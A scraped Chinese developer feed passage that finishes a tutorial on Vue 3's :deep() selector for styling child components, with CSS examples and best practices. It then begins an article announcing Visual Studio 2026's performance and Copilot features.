<span class="hljs-selector-class">.parent</span> <span class="hljs-selector-class">.child</span> :<span class="hljs-built_in">deep</span>() {
  <span class="hljs-attribute">color</span>: red;
}

<span class="hljs-comment">/* 错误的写法 - 选择器结构不合理 */</span>
:<span class="hljs-built_in">deep</span>() .parent .child {
  <span class="hljs-attribute">color</span>: red;
}

<span class="hljs-comment">/* 正确的写法 */</span>
<span class="hljs-selector-class">.parent</span> :<span class="hljs-built_in">deep</span>(.child) {
  <span class="hljs-attribute">color</span>: red;
}

:<span class="hljs-built_in">deep</span>(.parent .child) {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-3">实际场景中的应用技巧</h2>
<p>在实际开发中，我们会遇到各种需要使用<code>:deep()</code>的场景。下面分享几个实用的技巧。</p>
<p><strong>场景一：修改UI组件库的默认样式</strong></p>
<p>假设我们在使用Naive UI的表格组件，需要调整表头的样式：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"data-table"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">n-data-table</span>
      <span class="hljs-attr">:columns</span>=<span class="hljs-string">"columns"</span>
      <span class="hljs-attr">:data</span>=<span class="hljs-string">"data"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-table"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.data-table</span> :<span class="hljs-built_in">deep</span>(.custom-table .n-table-thead) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f8fafc</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
}

<span class="hljs-selector-class">.data-table</span> :<span class="hljs-built_in">deep</span>(.custom-table .n-table-th) {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span> <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
}

<span class="hljs-selector-class">.data-table</span> :<span class="hljs-built_in">deep</span>(.custom-table .n-table-td) {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">13px</span>;
}
</span></code></pre>
<p><strong>场景二：在插槽内容中应用样式</strong></p>
<p>当使用插槽时，插槽内容的样式也需要通过<code>:deep()</code>来穿透：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">modal-dialog</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">header</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dialog-title"</span>&gt;</span>自定义标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">content</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dialog-content"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这里是对话框内容<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">modal-dialog</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 修改对话框容器的样式 */</span>
:<span class="hljs-built_in">deep</span>(.modal-container) {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span> -<span class="hljs-number">5px</span> <span class="hljs-built_in">rgb</span>(<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> / <span class="hljs-number">0.1</span>);
}

<span class="hljs-comment">/* 修改插槽内容的样式 */</span>
:<span class="hljs-built_in">deep</span>(.dialog-title) {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#1f2937</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">16px</span>;
}

:<span class="hljs-built_in">deep</span>(.dialog-content) {
  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#6b7280</span>;
}
</span></code></pre>
<p><strong>场景三：配合CSS变量使用</strong></p>
<p><code>:deep()</code>还可以与CSS变量结合，实现更灵活的样式定制：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"theme-wrapper"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">third-party-component</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-theme"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.theme-wrapper</span> {
  <span class="hljs-comment">/* 定义CSS变量 */</span>
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#3b82f6</span>;
  <span class="hljs-attr">--secondary-color</span>: <span class="hljs-number">#ef4444</span>;
  <span class="hljs-attr">--border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-class">.theme-wrapper</span> :<span class="hljs-built_in">deep</span>(.custom-theme) {
  <span class="hljs-comment">/* 在深度选择器中使用CSS变量 */</span>
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--primary-color);
  <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">var</span>(--secondary-color);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-built_in">var</span>(--border-radius);
}

<span class="hljs-selector-class">.theme-wrapper</span> :<span class="hljs-built_in">deep</span>(.custom-theme .item) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--primary-color);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-built_in">var</span>(--border-radius) - <span class="hljs-number">2px</span>);
}
</span></code></pre>
<h2 data-id="heading-4">性能与最佳实践</h2>
<p>虽然<code>:deep()</code>很强大，但滥用会导致样式难以维护和性能问题。下面是一些最佳实践建议：</p>
<p><strong>1. 尽量少用深度选择器</strong></p>
<p>深度选择器破坏了组件的样式封装，应该作为最后的手段。优先考虑通过props传递样式配置，或者使用CSS变量。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 不推荐的写法：过度使用:deep() --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
:<span class="hljs-built_in">deep</span>(.child-component) {
  <span class="hljs-comment">/* 各种样式覆盖 */</span>
}

:<span class="hljs-built_in">deep</span>(.child-component .title) {
  <span class="hljs-comment">/* 更多样式覆盖 */</span>
}

:<span class="hljs-built_in">deep</span>(.child-component .content) {
  <span class="hljs-comment">/* 继续覆盖 */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 推荐的写法：通过CSS变量定制 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">child-component</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-child"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.custom-child</span> {
  <span class="hljs-attr">--child-primary-color</span>: <span class="hljs-number">#3b82f6</span>;
  <span class="hljs-attr">--child-padding</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attr">--child-border-radius</span>: <span class="hljs-number">8px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>2. 保持选择器的简洁性</strong></p>
<p>过于复杂的选择器会影响性能，特别是在大型应用中。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 不推荐：选择器过于复杂 */</span>
<span class="hljs-selector-class">.container</span> :<span class="hljs-built_in">deep</span>(.child &gt; .grandchild .item:first-of-type span.text) {
  <span class="hljs-attribute">color</span>: red;
}

<span class="hljs-comment">/* 推荐：尽量简化选择器 */</span>
<span class="hljs-selector-class">.container</span> :<span class="hljs-built_in">deep</span>(.text-highlight) {
  <span class="hljs-attribute">color</span>: red;
}
</span></code></pre>
<p><strong>3. 使用有意义的类名</strong></p>
<p>为需要深度样式的元素添加有意义的类名，提高代码可读性。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">third-party-component</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-styling"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 清晰的类名让代码更易理解 */</span>
<span class="hljs-selector-class">.custom-styling</span> :<span class="hljs-built_in">deep</span>(.tp-button--primary) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#10b981</span>;
}

<span class="hljs-selector-class">.custom-styling</span> :<span class="hljs-built_in">deep</span>(.tp-button--primary:hover) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#059669</span>;
}
</span></code></pre>
<h2 data-id="heading-5">常见问题与解决方案</h2>
<p>在实际使用<code>:deep()</code>时，开发者经常会遇到一些问题。这里总结几个常见的情况：</p>
<p><strong>问题一：样式不生效</strong></p>
<p>这种情况通常是因为选择器写得不对，或者Vue版本不支持。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 可能的问题：Vue版本过低 */</span>
<span class="hljs-comment">/* 确保使用Vue 3.2+ 版本 */</span>

<span class="hljs-comment">/* 可能的问题：选择器结构错误 */</span>
<span class="hljs-selector-class">.parent</span> :<span class="hljs-built_in">deep</span>(.child .grandchild) {
  <span class="hljs-comment">/* 正确的结构 */</span>
}

<span class="hljs-comment">/* 可能的问题：缺少必要的类名 */</span>
<span class="hljs-comment">/* 检查子组件是否真的有这个类名 */</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>问题二：样式覆盖冲突</strong></p>
<p>当多个<code>:deep()</code>选择器 targeting 同一个元素时，可能会出现样式冲突。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 方案一：提高选择器特异性 */</span>
<span class="hljs-selector-class">.page-container</span> <span class="hljs-selector-class">.section</span> :<span class="hljs-built_in">deep</span>(.target-element) {
  <span class="hljs-attribute">color</span>: blue;
}

<span class="hljs-comment">/* 方案二：使用!important（谨慎使用） */</span>
<span class="hljs-selector-class">.page-container</span> :<span class="hljs-built_in">deep</span>(.target-element) {
  <span class="hljs-attribute">color</span>: blue <span class="hljs-meta">!important</span>;
}

<span class="hljs-comment">/* 方案三：调整样式顺序 */</span>
<span class="hljs-comment">/* 后面的样式会覆盖前面的 */</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>问题三：与预处理器冲突</strong></p>
<p>在使用Sass、Less等预处理器时，需要注意语法兼容性。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span> <span class="hljs-attr">scoped</span>&gt;</span>
.parent {
  padding: 20px;

  /* 在Sass中正常使用 */
  :deep(.child) {
    margin: 10px;
    
    .grandchild {
      color: red;
    }
  }
}

/* 或者使用插值语法 */
.parent :deep(#{$child-selector}) {
  background: white;
}
<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-6">结合Composition API使用</h2>
<p>在Vue 3的Composition API中，我们还可以通过更编程式的方式来处理样式问题。</p>
<p>虽然不能直接通过Composition API修改子组件样式，但我们可以通过动态类名和样式的方式来配合<code>:deep()</code>使用：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">"containerClass"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">third-party-component</span> 
      <span class="hljs-attr">:class</span>=<span class="hljs-string">"componentClass"</span>
      <span class="hljs-attr">:style</span>=<span class="hljs-string">"componentStyle"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">variant</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-string">'primary'</span>
  }
})

<span class="hljs-keyword">const</span> containerClass = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-string">'theme-container'</span>: <span class="hljs-literal">true</span>,
  [<span class="hljs-string">`theme-<span class="hljs-subst">${props.variant}</span>`</span>]: <span class="hljs-literal">true</span>
}))

<span class="hljs-keyword">const</span> componentClass = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-string">'custom-component'</span>: <span class="hljs-literal">true</span>,
  [<span class="hljs-string">`variant-<span class="hljs-subst">${props.variant}</span>`</span>]: <span class="hljs-literal">true</span>
}))

<span class="hljs-keyword">const</span> componentStyle = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> ({
  <span class="hljs-string">'--custom-primary'</span>: props.<span class="hljs-property">variant</span> === <span class="hljs-string">'primary'</span> ? <span class="hljs-string">'#3b82f6'</span> : <span class="hljs-string">'#ef4444'</span>
}))
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.theme-container</span> :<span class="hljs-built_in">deep</span>(.custom-component) {
  <span class="hljs-comment">/* 基础样式 */</span>
}

<span class="hljs-selector-class">.theme-container</span><span class="hljs-selector-class">.theme-primary</span> :<span class="hljs-built_in">deep</span>(.custom-component.variant-primary) {
  <span class="hljs-comment">/* 主要变体样式 */</span>
}

<span class="hljs-selector-class">.theme-container</span><span class="hljs-selector-class">.theme-danger</span> :<span class="hljs-built_in">deep</span>(.custom-component.variant-danger) {
  <span class="hljs-comment">/* 危险变体样式 */</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-7">总结</h2>
<p><code>:deep()</code>选择器是Vue 3样式系统中一个非常重要的特性，它为我们提供了一种标准化的方式来处理组件样式穿透的需求。从Vue 2的各种混乱语法到Vue 3的统一<code>:deep()</code>，这反映了Vue团队在改善开发者体验方面的持续努力。</p>
<p>回顾一下我们今天讨论的重点：<code>:deep()</code>解决了组件样式作用域带来的限制，让我们能够在父组件中修改子组件的样式。它的语法简洁明了，与现代CSS标准保持一致，而且与各种预处理器良好兼容。</p>
<p>但是，能力越大责任越大。我们应该谨慎使用<code>:deep()</code>，优先考虑通过组件接口(props、emits)和CSS变量来实现样式定制。只有当这些方法都无法满足需求时，才考虑使用<code>:deep()</code>。</p>
<p>在实际项目中，合理使用<code>:deep()</code>可以让我们的代码更整洁、更易维护。记住我们今天讨论的最佳实践：保持选择器简洁、使用有意义的类名、避免过度使用。</p>
<p>希望这篇文章能够帮助你更好地理解和使用Vue 3的<code>:deep()</code>选择器。现在，当你在项目中遇到需要修改子组件样式的情况时，你应该能够自信地选择最合适的解决方案了。</p>
<p>如果你在使用过程中遇到其他问题，或者有更好的使用技巧，欢迎在评论区分享你的经验。 Happy coding！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Visual Studio 2026 现已正式发布，更快、更智能！]]></title>    <link>https://juejin.cn/post/7576223441712791595</link>    <guid>https://juejin.cn/post/7576223441712791595</guid>    <pubDate>2025-11-25T00:23:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576223441712791595" data-draft-id="7576130618905313316" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Visual Studio 2026 现已正式发布，更快、更智能！"/> <meta itemprop="keywords" content="Visual Studio,.NET"/> <meta itemprop="datePublished" content="2025-11-25T00:23:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="追逐时光者"/> <meta itemprop="url" content="https://juejin.cn/user/2770425031690333"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Visual Studio 2026 现已正式发布，更快、更智能！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2770425031690333/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    追逐时光者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:23:03.000Z" title="Tue Nov 25 2025 00:23:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>前不久 Visual Studio 官方博客宣布 Visual Studio 2026 正式发布！本次版本凝聚了广大开发者的宝贵反馈，博客中提及在此版本发布之前的一年里，Visual Studio 团队修复了 5000 多个用户报告的缺陷，并实现了 300 个功能请求。</p>
<p>新版本带来显著性能提升、全新用户体验和更强的 AI 开发能力，让编码更流畅、高效，助您更快将创意变为现实。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b80b781c74be4f3cb573d45f68231ca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=5R19KKzNQ1H6umYLRJHrT8xZFrw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">Visual Studio 2026 下载</h2>
<ul>
<li>下载地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fvisualstudio.microsoft.com%2Fzh-hans%2Fdownloads" target="_blank" title="https://visualstudio.microsoft.com/zh-hans/downloads" ref="nofollow noopener noreferrer">visualstudio.microsoft.com/zh-hans/dow…</a></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/27b7a0d666934498b08fc58dd12c6fb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=06R6i%2Bi0RmL7sbMT14DAW%2FbgXP8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">性能显著提升</h2>
<p>Visual Studio 2026 运行得更快、更流畅、响应更快：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0f64861aee54ff3a4c52d99f331c22b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=OamUw3kBdxIY%2BVIopH%2FMi3mIUv0%3D" alt="" loading="lazy"/></p>
<p>Visual Studio 2026 中的大型 .NET 解决方案交互加载时间比 Visual Studio 2022 更快：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4449997f96fd416bb71dbbdf6d14a877~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=HNAahZzlMFdqVOYA28gLCeKzj74%3D" alt="" loading="lazy"/></p>
<p>Visual Studio 2026 显示 UI 无响应的时间量小于 Visual Studio 2022 在大型解决方案负载上的一半：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fa33404799342d3863b3c2138514599~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634982&amp;x-signature=qI0FWLDqGfF6cq2Ge0ZuPF%2FNkEc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">智能开发人员环境 （IDE）</h2>
<p>Visual Studio 2026 是 AI 原生的，使其成为世界上第一个智能开发人员环境 （IDE）。这并不意味着改变你的工作方式。这意味着在最重要的时候给你情报。如果您正在调试棘手的问题、分析性能或对应用程序进行现代化改造，AI 会介入以消除摩擦并提供见解，从而帮助您在不中断流程的情况下更快地行动。它的存在是为了提升您已经信任的做法，而不是取代它们。</p>
<h3 data-id="heading-4">Copilot URL 上下文</h3>
<p>你是否曾因 Copilot 的训练数据未涵盖某个主题而感到困扰？现在，你可以在 Copilot Chat 中直接引用网页链接（URL），为问题提供额外上下文，从而获得更准确、更有针对性的回答。</p>
